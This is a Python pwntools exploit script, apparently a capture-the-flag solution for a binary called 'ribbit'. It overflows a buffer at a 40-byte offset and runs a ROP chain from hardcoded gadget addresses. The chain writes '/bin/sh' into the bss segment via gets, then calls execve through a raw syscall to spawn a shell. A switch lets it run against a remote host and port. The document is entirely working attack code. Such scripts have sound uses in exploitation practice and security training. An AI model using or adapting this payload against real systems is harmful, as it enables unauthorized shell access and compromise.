from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
b *win
continue
'''.format(**locals())

# Binary filename
exe = './ribbit'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
context.terminal = 'kitty'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = 40

# Start program
io = start()

bss = elf.bss()

syscall = 0x0000000000401dd4
pop_rax = 0x0000000000449267
pop_rdi = 0x000000000040201f
pop_rsi = 0x000000000040a04e
pop_rdx = 0x000000000047fe1a

# Build the payload
payload = flat({
    offset: [
        # Phase 1, write /bin/sh to bss segment
        pop_rdi,
        bss, elf.sym['gets'],
        # Phase 2, execve('/bin/sh', 0, 0)
        pop_rax,
        59, # Syscall number for execve()
        pop_rdi,
        bss, # /bin/sh should already written to bss
        pop_rsi,
        0x0,
        pop_rdx,
        0x0,
        syscall
    ]
})

# Send the payload
io.sendline(payload)
io.sendline(b'/bin/sh\x00') # Write /bin/sh to bss segment
# Got Shell?
io.interactive()
